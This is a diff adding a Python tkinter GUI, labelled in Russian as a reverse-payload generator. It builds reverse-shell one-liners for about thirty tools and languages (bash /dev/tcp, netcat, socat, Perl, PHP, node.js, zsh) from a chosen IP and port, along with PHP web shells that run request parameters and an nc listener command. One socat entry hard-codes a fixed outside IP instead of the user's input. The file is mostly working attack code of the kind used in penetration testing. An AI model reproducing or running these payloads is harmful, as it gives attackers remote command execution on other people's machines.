@@ -1,0 +1,154 @@
+from tkinter import *
+from tkinter import ttk
+from tkinter import messagebox as mb
+import re
+
+root = Tk()
+root.title("Генератор Rev_Payload")
+root.geometry('900x430')
+root.configure(bg='gray')
+
+def create_shell(lang, shell, host, port):
+    if lang == "Bash -i":
+        payload = f"{shell} >& /dev/tcp/{host}/{port} 0>&1"
+    elif lang == "Bash 196":
+        payload = f"0<&196;exec 196<>/dev/tcp/{host}/{port}; {shell} <&196 >&196 2>&196"
+    elif lang == "Bash read line":
+        payload = f"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"
+    elif lang == "Bash 5":
+        payload = f"{shell} -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5"
+    elif lang == "Bash UDP":
+        payload = f"{shell} -i >& /dev/udp/{host}/{port} 0>&1"
+    elif lang == "nc mkfifo":
+        payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f"
+    elif lang == "nc -e":
+        payload = f"nc {host} {port} -e {shell}"
+    elif lang == "nc.exe":
+        payload = f"nc.exe {host} {port} -e {shell}"
+    elif lang == "BusyBox nc -e":
+        payload = f"busybox nc {host} {port} -e {shell}"
+    elif lang == "nc -c":
+        payload = f"nc -c {shell} {host} {port}"
+    elif lang == "ncat -e":
+        payload = f"ncat {host} {port} -e {shell}"
+    elif lang == "cURL":
+        payload = f"C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null"
+    elif lang == "rustcat":
+        payload = f"rcat connect -s {shell} {host} {port}"
+    elif lang == "Perl no sh":
+        payload = f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'{host}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    elif lang == "PHP cmd":
+        payload = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'
+    elif lang == "PHP cmd small":
+        payload = "<?php system($_GET['cmd'])?>"
+    elif lang == "PHP cmd small 2":
+        payload = "<?=`$_GET[0]`?>"
+    elif lang == "PHP exec":
+        payload =f"php -r '$sock=fsockopen('{host}',{port});exec('{shell} <&3 >&3 2>&3');'"
+    elif lang == "PHP shell_exec":
+        payload =f"php -r '$sock=fsockopen('{host}',{port});shell_exec('{shell} <&3 >&3 2>&3');'"
+    elif lang == "PHP system":
+        payload =f"php -r '$sock=fsockopen('{host}',{port});system('{shell} <&3 >&3 2>&3');'"
+    elif lang == "PHP passthru":
+        payload =f"php -r '$sock=fsockopen('{host}',{port});passthru('{shell} <&3 >&3 2>&3');'"
+    elif lang == "PHP `":
+        payload =f"php -r '$sock=fsockopen('{host}',{port});`sh <&3 >&3 2>&3`;'"
+    elif lang == "PHP popen":
+        payload = f"php -r '$sock=fsockopen('{host}',{port});popen('{shell} <&3 >&3 2>&3', 'r');'"
+    elif lang == "ruby":
+        payload = f"ruby - rsocket - e 'spawn('sh',[:in,:out,:err]=>TCPSocket.new('{host}',{port}))'"
+    elif lang == "socat":
+        payload = f"socat TCP:{host}:{port} EXEC:{shell}"
+    elif lang == "socat TTY":
+        payload = f"socat TCP:95.181.173.188:31337 EXEC:'sh',pty,stderr,setsid,sigint,sane"
+    elif lang == "sqlite3 nc mkfifo":
+        payload = f"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f'"
+    elif lang == "node.js":
+        payload = f"require('child_process').exec('nc -e {shell} {host} {port}')"
+    elif lang == "telnet":
+        payload = f"TF=$(mktemp -u);mkfifo $TF && telnet {host} {port} 0<$TF | {shell} 1>$TF"
+    elif lang == "zsh":
+        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {host} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+    return payload
+
+def create_rev(port):
+    rev_payload = f"nc -lvnp {port}"
+    return rev_payload
+class Body:
+    def __init__(self):
+        self.lang = StringVar()
+        self.shell = StringVar()
+
+        self.target = Label(root, bg='gray', text="RHOST", font='TimesNewRoman 12')
+        self.listener = Label(root, bg='gray', text="LHOST", font='TimesNewRoman 12')
+        self.host = Label(root, bg='gray', text="IP", font='TimesNewRoman 12')
+        self.port = Label(root, bg='gray', text="PORT", font='TimesNewRoman 12')
+        self.lan = Label(root, bg='gray', text="OS", font='TimesNewRoman 12')
+        self.sh = Label(root, bg='gray', text="shell", font='TimesNewRoman 12')
+
+        self.output_shell = Text(root, height=20, width=70, font="TimesNewRoman 12")
+        self.output_rev = Text(root, height=5, width=22, font="TimesNewRoman 12", wrap=WORD)
+
+        self.input_host = Entry(root, width=14, bd=3)
+        self.input_port = Entry(root, width=6, bd=3)
+
+        # Кнопка для создания shell
+        self.create_shell_button = Button(root, height=1, width=10, bg='black', fg='white', text='Создать shell', command=self.create_shell)
+
+        # Выпадающий список для языка
+        self.list_lang = ["Bash -i", "Bash 196", "Bash read line", "Bash 5", "Bash UDP", "nc mkfifo" ,"nc -e", "nc.exe", "BusyBox nc -e", "nc -c", "ncat -e", "cURL", "rustcat", "Perl no sh", "PHP cmd", "PHP cmd small", "PHP cmd small 2", "PHP exec", "PHP shell_exec", "PHP system", "PHP passthru", "PHP `", "PHP popen", "ruby", "socat", "socat TTY", "sqlite3 nc mkfifo", "node.js", "telnet", "zsh"]
+        self.combobox_lang = ttk.Combobox(root, textvariable=self.lang, width=30)
+        self.combobox_lang['values'] = self.list_lang
+        self.combobox_lang['state'] = 'readonly'
+
+        # Выпадающий список для shell
+        self.list_shell = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']
+        self.combobox_shell = ttk.Combobox(root, textvariable=self.shell, width=30)
+        self.combobox_shell['values'] = self.list_shell
+        self.combobox_shell['state'] = 'readonly'
+
+    def add(self):
+        self.target.place(x=20, y=10)
+        self.listener.place(x=735, y=10)
+        self.host.place(x=668, y=145)
+        self.port.place(x=783, y=145)
+        self.sh.place(x=670, y=178)
+        self.lan.place(x=670, y=218)
+
+        self.output_shell.place(x=20, y=40)
+        self.output_rev.place(x=670, y=40)
+
+        self.input_host.place(x=690, y=145)
+        self.input_port.place(x=830, y=145)
+
+        self.create_shell_button.place(x=730, y=300)
+
+        self.combobox_shell.place(x=670, y=200)
+        self.combobox_lang.place(x=670, y=240)
+        self.output_shell.delete(1.0, END)
+        self.output_shell.insert(END, "                                          Здесь будет PAYLOAD для RHOST")
+        self.output_rev.delete(1.0, END)
+        self.output_rev.insert(END, "    PAYLOAD для LHOST")
+
+    def create_shell(self):
+        pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
+
+        if self.combobox_shell.get() == "" or self.combobox_lang.get() == "" or self.input_port.get() == "" or self.input_host.get() == "":
+            mb.showwarning("Предупреждение", "Поля не должны быть пустые!!!")
+        elif not pattern.match(self.input_host.get()) and self.input_host.get() != "":
+            mb.showwarning("Предупреждение", "Значение IP неверно!!!")
+        else:
+            host = self.input_host.get()
+            port = self.input_port.get()
+            lang = self.combobox_lang.get()
+            shell = self.combobox_shell.get()
+            shell_payload = create_shell(lang, shell, host, port)
+            rev_payload = create_rev(port)
+            self.output_shell.delete(1.0, END)
+            self.output_shell.insert(END, shell_payload)
+            self.output_rev.delete(1.0, END)
+            self.output_rev.insert(END, rev_payload)
+
+body = Body()
+body.add()
+root.mainloop()
